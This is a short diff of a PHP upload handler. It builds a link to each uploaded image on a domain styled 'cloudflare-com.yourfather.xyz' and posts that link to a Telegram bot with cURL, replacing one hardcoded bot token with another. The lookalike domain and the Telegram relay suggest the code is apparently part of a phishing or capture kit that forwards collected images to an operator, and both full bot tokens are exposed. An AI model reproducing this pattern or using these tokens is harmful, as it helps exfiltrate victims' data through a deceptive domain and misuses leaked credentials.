@@ -34,7 +34,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // Send the image link to the Telegram API
             $img_url = 'https://cloudflare-com.yourfather.xyz/' . $filePath; // Update with your website's URL
-            $telegramUrl = 'https://api.telegram.org/bot7290665191:AAEJWO_EnZmQyQWKS5b8nvYksOYjjp5EyAY/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;
+            $telegramUrl = 'https://api.telegram.org/bot7476980545:AAEnRqJFjnHAVByCxUdLLJI2_fTq7WmP0A8/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;
 
             // Use cURL to send the request
             $ch = curl_init($telegramUrl);
